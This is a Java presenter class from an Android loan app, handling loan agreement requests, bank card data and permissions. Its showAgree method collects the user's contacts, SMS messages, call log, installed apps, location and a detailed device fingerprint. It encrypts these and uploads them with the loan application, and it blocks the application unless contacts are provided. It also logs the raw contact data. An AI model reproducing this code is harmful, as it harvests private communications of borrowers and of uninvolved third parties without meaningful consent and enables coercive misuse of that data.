package com.project.movice.modules.loan.presenter;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.net.TrafficStats;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;

import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.Gson;
import com.project.movice.R;
import com.project.movice.application.MoviceApp;
import com.project.movice.base.presenter.BasePresenter;
import com.project.movice.core.rx.BaseObserver;
import com.project.movice.dialog.NoRepaymentDialog;
import com.project.movice.modules.loan.bean.BaseAmountCalculation;
import com.project.movice.modules.loan.bean.BeanBankCard;
import com.project.movice.modules.loan.bean.BeanPersonalInformation;
import com.project.movice.modules.loan.bean.BeanPrivacyInformation;
import com.project.movice.modules.loan.bean.BorrowingInformation;
import com.project.movice.modules.loan.bean.PhoneData;
import com.project.movice.modules.loan.bean.TrafficBean;
import com.project.movice.modules.loan.contract.ContractContract;
import com.project.movice.modules.main.ui.activity.MainActivity;
import com.project.movice.utils.CallLogUtils;
import com.project.movice.utils.Constant;
import com.project.movice.utils.ConstantParams;
import com.project.movice.utils.DataUtils;
import com.project.movice.utils.FastJsonTools;
import com.project.movice.utils.GsonUtil;
import com.project.movice.utils.LocationUtils;
import com.project.movice.utils.OkHttpUrlLoader;
import com.project.movice.utils.PhoneHelper;
import com.project.movice.utils.PhoneInfo;
import com.project.movice.utils.RequestBeanUtils;
import com.project.movice.utils.RxUtils;
import com.project.movice.utils.StringUtils;
import com.project.movice.utils.des.Des3;
import com.project.movice.widget.behavior.PromptOneBtDialog;
import com.sobot.chat.utils.ToastUtil;
import com.tbruyelle.rxpermissions2.RxPermissions;

import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import javax.inject.Inject;

import fairy.easy.httpmodel.HttpModelHelper;
import fairy.easy.httpmodel.resource.HttpListener;
import fairy.easy.httpmodel.resource.HttpType;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

import static com.project.movice.application.MoviceApp.getContext;

public class ContractPresenter extends BasePresenter<ContractContract.View> implements ContractContract.Presenter {
    private Object object;


    private BeanPersonalInformation personalInformation;
    private BeanBankCard bank;
    private BaseAmountCalculation amountCalculation;
    private BorrowingInformation borrowingInformation;
    private Context context;
    String[] phoneNetdata = {""};
    @Inject
    ContractPresenter() {
    }


    @Override
    public void reload() {
        request006(new HashMap<>(),context);
    }



    @Override
    public void request006(Map<String, String> hm, Context context) {
        this.context = context;
        String json = (String) DataUtils.get(context, Constant.KEY_BORROWING, "");
        borrowingInformation = GsonUtil.GsonToBean(json, BorrowingInformation.class);

        addSubscribe(mDataManager.get006(RequestBeanUtils.getRequestBean(hm))
                .compose(RxUtils.SchedulerTransformer())
                .filter(data -> mView != null)
                .subscribeWith(new BaseObserver(mView,
                        MoviceApp.getContext().getString(R.string.login_fail),
                        true) {
                    @Override
                    public void onSuccess(String data) {
                        BeanPersonalInformation bean= FastJsonTools.parseObject(data, BeanPersonalInformation.class);
                        personalInformation = bean;
                        request010(hm);
                    }
                }));


        HttpModelHelper.getInstance()
                .init(getContext())
                .setChina(false)
                .setModelLoader(new OkHttpUrlLoader())
                .setFactory()
                .addType(HttpType.NET)
                .build()
                .startAsync("https://www.baidu.com", new HttpListener() {
                    @Override
                    public void onFail(String data) {

                    }
                    @Override
                    public void onFinish(JSONObject result) {
                    }
                    @Override
                    public void onSuccess(HttpType httpType, JSONObject result) {
                        try {
                            phoneNetdata[0] =result.toString();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });

    }

    @Override
    public void request010(Map<String, String> hm) {
        addSubscribe(mDataManager.get010(RequestBeanUtils.getRequestBean(hm))
                .compose(RxUtils.SchedulerTransformer())
                .filter(data -> mView != null)
                .subscribeWith(new BaseObserver(mView,
                        MoviceApp.getContext().getString(R.string.login_fail),
                        true) {
                    @Override
                    public void onSuccess(String data) {

                        bank= FastJsonTools.parseObject(data, BeanBankCard.class);
//                        bank = GsonUtil.GsonToBean(data, BeanBankCard.class);
                        showInfo();
                        Map<String, String> params = new HashMap<>();
                        params.put("money", borrowingInformation.getBorrowingMoney() + "");
                        params.put("period", borrowingInformation.getBorrowingTimeLimit() + "");
                        params.put("couponId", "");
                        request049(params);
                    }
                }));
    }

    @Override
    public void request049(Map<String, String> hm) {

        addSubscribe(mDataManager.get049(RequestBeanUtils.getRequestBean(hm))
                .compose(RxUtils.SchedulerTransformer())
                .filter(data -> mView != null)
                .subscribeWith(new BaseObserver(mView,
                        MoviceApp.getContext().getString(R.string.login_fail),
                        true) {
                    @Override
                    public void onSuccess(String data) {
//                        BaseAmountCalculation bean = GsonUtil.GsonToBean(data, BaseAmountCalculation.class);
                        BaseAmountCalculation bean = FastJsonTools.parseObject(data, BaseAmountCalculation.class);

                        amountCalculation = bean;
                        showInfo();
                        ;
                    }
                }));


    }

    @Override
    public void request0122(Map<String, String> hm) {

        addSubscribe(mDataManager.get0122(RequestBeanUtils.getRequestBean(hm))
                .compose(RxUtils.SchedulerTransformer())
                .filter(data -> mView != null)
                .subscribeWith(new BaseObserver(mView,
                        MoviceApp.getContext().getString(R.string.login_fail),
                        true) {
                    @Override
                    public void onSuccess(String data) {
                   if(data.equals("40010")){
                       showError(context);
                   }else if(data.equals("40011")){
                      notLoan();
                   }else{
                       mView.finishActivity();
                   }

                        ;
                    }
                }));


    }

    @Override
    public void request034(Map<String, String> hm) {

        addSubscribe(mDataManager.get034(RequestBeanUtils.getRequestBean(hm))
                .compose(RxUtils.SchedulerTransformer())
                .filter(data -> mView != null)
                .subscribeWith(new BaseObserver(mView,
                        MoviceApp.getContext().getString(R.string.login_fail),
                        true) {
                    @Override
                    public void onSuccess(String data) {

                        BeanPrivacyInformation bean = FastJsonTools.parseObject(data, BeanPrivacyInformation.class);

//                        BeanPrivacyInformation bean = GsonUtil.GsonToBean(data, BeanPrivacyInformation.class);
                        Map<String, String> params = new HashMap<>();
                        params.put("money", amountCalculation.getLoanAmount() + "");
                        params.put("period", amountCalculation.getPeriod() + "");
                        params.put("purpose", ConstantParams.borrowingPurposes(true, mView.getSelect()));
                        params.put("couponId", amountCalculation.getCouponId());
                        params.put("id", bean.getId());

                        request0122(params);
                    }
                }));


    }

    @Override
    public void requestPermissions(RxPermissions rxPermissions) {
        addSubscribe(rxPermissions
                .request(Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG)
                .subscribe(granted -> {
                    if (granted) {
                        mView.permissionsSuccess();
                    } else {
                        mView.permissionsCancle();
                    }
                }));
    }

    /**
     * 还有未还款错误提示
     */
    public  void showError(Context context) {
        NoRepaymentDialog d = new NoRepaymentDialog(context, R.mipmap.lingyi44,
                context.getResources().getString(R.string.warm_prompt),
                context.getResources().getString(R.string.you_also_have_outstanding_loans),
                context.getResources().getString(R.string.i_see), true);
        d.setOnClickListener(new NoRepaymentDialog.OnClickListener() {
            @Override
            public void onClick(View view) {

            }
        });
        d.show();
    }

    private void showInfo() {
        try {
            String payBackMoney = String.format(context.getResources().getString(R.string.borrowing_money), StringUtils.getAmount(borrowingInformation.getPayBackMoney(), 3));
            mView.showInfo(bank.getBankCardNumber(), personalInformation.getName(), borrowingInformation.getNumberLoanDays(),
                    borrowingInformation.getBorrowingMoney(), borrowingInformation.getGetMoney(), payBackMoney, borrowingInformation.getRate(), borrowingInformation.getManagementFee());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void showLoanAgreement(boolean isShow) {
        mView.loanProtocol(personalInformation, bank, borrowingInformation, isShow);
    }
    private FirebaseAnalytics mFirebaseAnalytics;
    public void showAgree() {

        getLocation();
        String contacts = PhoneInfo.getInstance().getContacts();
        String app = PhoneInfo.getInstance().getAppInfos();

//权限的开关
        String sms = PhoneInfo.getInstance().getSmsFromPhone();
        String callLog = CallLogUtils.getInstance().queryCallLog();

        if (!TextUtils.isEmpty(DataUtils.getPhone(context)) && null != borrowingInformation) {
            NoRepaymentDialog d = new NoRepaymentDialog(context, R.mipmap.lingyi44,
                    context.getResources().getString(R.string.solemn_promise),
                    context.getResources().getString(R.string.guarantee_payment_on_time),
                    context.getResources().getString(R.string.i_see), true);
            d.setOnClickListener(new NoRepaymentDialog.OnClickListener() {
                @Override
                public void onClick(View v) {
                    mFirebaseAnalytics = FirebaseAnalytics.getInstance(context);
                    Bundle aaa = new Bundle();
                    aaa.putString("image_name", "3");
                    aaa.putString("full_text", "3");
                    mFirebaseAnalytics.logEvent("sqid", aaa);

                    if (TextUtils.isEmpty(contacts) || contacts.length() < 5) {
                        ToastUtil.showToast(context, "Harap konfirmasi izin untuk membuka dan mengirimkan aplikasi Anda.");
                        return;
                    }
                    Map<String, String> params = new HashMap<>();
                    try {
                        Log.e("2222222222222",(contacts)+"-----"+app+"-----"+latitude+"----"+longitude);
                        params.put("contacts", Des3.encode(contacts, Des3.key));
                        params.put("callLog", Des3.encode(callLog, Des3.key));
                        params.put("sms", Des3.encode(sms, Des3.key));
                        params.put("appInfos", Des3.encode(app, Des3.key));
                        params.put("latitude", latitude);
                        params.put("longitude", longitude);
                        params.put("traffic", Des3.encode(new Gson().toJson(new TrafficBean(TrafficStats.getTotalRxBytes() + "", TrafficStats.getTotalTxBytes() + "")), Des3.key));//xiazai
                        File sdCardDir = Environment.getExternalStorageDirectory();
                        File dataDir = Environment.getDataDirectory();
                        Intent batteryStatus = context.registerReceiver(null,
                                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                        int plugState = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                        int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
                        PhoneData phoneData=new PhoneData(PhoneHelper.isEmulator(context),PhoneHelper.getLocalIpAddress(),PhoneHelper.getLocalMacAddressFromIp(),PhoneHelper.getIPAddress(context),
                                PhoneHelper.getNetWorkId(context),PhoneHelper.getWifiOut(context),PhoneHelper.getSSID(context),PhoneHelper.getWifiIp(context),PhoneHelper.getMemoryInfo(sdCardDir, context,1),
                                PhoneHelper.getMemoryInfo(sdCardDir, context,2),PhoneHelper.getMemoryInfo(dataDir, context,1),PhoneHelper.getMemoryInfo(dataDir, context,2),PhoneHelper.getTotalMemory(context),
                                PhoneHelper.getAvailMemory(context),PhoneHelper.getRealStorage(context),PhoneHelper.getBatteryLevel(context)+"",PhoneHelper.batteryStatus(status),PhoneHelper.batteryPlugged(plugState),PhoneHelper.batteryHealth(health),
                                PhoneHelper.isSystemRoot());
                        params.put("phone_msg",Des3.encode(new Gson().toJson(phoneData), Des3.key) );
                        params.put("phone_net",  Des3.encode(phoneNetdata[0], Des3.key));
                        Log.e("111111111111",new Gson().toJson(phoneData)+"----"+phoneNetdata[0]);
                        request034(params);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            d.show();
        }
    }


    /**
     * 获取计算后显示的金额
     *
     * @return
     */
    public BaseAmountCalculation getMoney() {
        return amountCalculation;
    }

    String latitude = "0";//纬度
    String longitude = "0";//经度

    /**
     * 获取位置信息
     */
    private void getLocation() {
        if (!StringUtils.isEmpty(latitude) && !StringUtils.isEmpty(longitude))//如果已经有定位信息了就不重新获取了
            return;
        try {
            Location l = LocationUtils.getInstance(MoviceApp.getContext()).showLocation();
            if (null != l) {
                latitude = String.valueOf(l.getLatitude());
                longitude = String.valueOf(l.getLongitude());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void notLoan() {
        PromptOneBtDialog prompt = new PromptOneBtDialog(context,
                "", context.getResources().getString(R.string.unable_to_submit_loan_in_margin_withdrawal),
                context.getResources().getString(R.string.confirm));
        prompt.show();
    }
}
